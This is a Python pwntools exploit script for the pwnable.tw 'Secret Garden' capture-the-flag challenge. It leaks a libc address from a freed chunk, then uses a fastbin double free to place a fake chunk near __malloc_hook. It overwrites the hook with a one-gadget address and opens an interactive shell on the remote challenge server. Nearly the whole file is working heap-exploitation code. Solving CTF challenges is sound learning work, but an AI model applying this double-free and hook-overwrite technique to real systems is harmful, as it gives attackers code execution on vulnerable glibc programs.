#!/usr/bin/env python3
from pwn import *
import sys
import os
import socks
import socket
# Cre: Broder


context.log_level = 'debug'
context.binary = elf = ELF('./secretgarden_patched', checksec=False)
libc = ELF("./libc_64.so.6")
ld = ELF("./ld-2.23.so")

_arch = 64

environ = {
    'LD_PRELOAD': os.path.join(os.getcwd(), './libc.so.6'),
    'LD_LIBRARY_PATH': os.path.join(os.getcwd(), './')
}

gs = f"""
set solib-search-path {os.getcwd()}
decompiler connect ida --host 172.19.176.1 --port 3662
c
"""

info = lambda msg: log.info(msg)
success = lambda msg: log.success(msg)
sla = lambda msg, data: io.sendlineafter(msg, data)
sa = lambda msg, data: io.sendafter(msg, data)
sl = lambda data: io.sendline(data)
s = lambda data: io.send(data)
rcu = lambda data: io.recvuntil(data)

def p(_data):
    if(_arch == 64):
        return p64(_data, endian = 'little')
    return p32(_data, endian = 'little')

def start():
    if args.GDB:
        return gdb.debug(elf.path, gdbscript=gs)
        # return gdb.debug(elf.path, env=environ, gdbscript=gs)
    elif args.REMOTE:
        return remote('chall.pwnable.tw', 10203)
    else:
        return process(elf.path)
        # return process(elf.path, env=environ)

index = 0

def add(size, name, color):
    global index
    io.sendline(b'1')
    io.sendlineafter(b'Length of the name :', str(size).encode())
    io.sendlineafter(b'The name of flower :', name)
    io.sendlineafter(b'The color of the flower :', color)
    io.recvuntil(b'Your choice : ')
    index += 1
    return index - 1

def show():
    io.sendline(b'2')
    #io.recvuntil(b'Your choice : ')

def free(index):
    io.sendline(b'3')
    io.sendlineafter(b'Which flower do you want to remove from the garden:', f'{index}'.encode())
    io.recvuntil(b'Your choice : ')

def clean():
    io.sendline(b'4')
    io.recvuntil(b'Your choice : ')

def exit():
    io.sendline(b'5')



io = start()
#io.timeout = 0.1
io.recvuntil(b'Your choice : ')

'''
LEAK HEAP

add(2, b'aa', b'AA')
add(2, b'bb', b'BB')

free(0)
free(1)
free(0)

add(0, b'', b'CC')
show()

io.recvuntil(b'Name of the flower[2] :')
leak_heap = u64(io.recv(6) + b'\x00\x00')
info(hex(leak_heap))
'''
#=================================================================================
# LEAK libc

chunk_a = add(0x100, b'aa', b'AA')
chunk_b = add(0x100, b'bb', b'BB')

free(chunk_a)

chunk_c = add(0xd8, b'c'*8, b'C'*8)
show()
io.recvuntil(b'Name of the flower[2] :cccccccc')
leak_libc = u64(io.recv(6) + b'\x00\x00')
libc.address = leak_libc - 0x3c3b0a
info("Leak address: " + hex(leak_libc))
info("libc base: " + hex(libc.address))
io.recvuntil(b'Your choice : ')


#================================================================================
#FAST BINS dup

chunk_d = add(0x68, b'd'*4, b'D'*4)

chunk_e = add(0x68, b'e'*4, b'E'*4)

free(chunk_d)
free(chunk_e)
free(chunk_d)

dup = add(0x68, p64(libc.sym['__malloc_hook'] - 35), b'F'*4)
gar1 = add(0x68, b'g'*4, b'G'*4)
gar2 = add(0x68, b'i'*4, b'I'*4)

overwrite = add(0x68,b'a' * 19 + p64(libc.address + 0xef6c4), b'J'*4)

#add(0x68, b'test', b'oke')
free(gar1)
io.sendline(b'3')
io.sendlineafter(b'Which flower do you want to remove from the garden:', f'{gar1}'.encode())
#free(gar2)

io.interactive()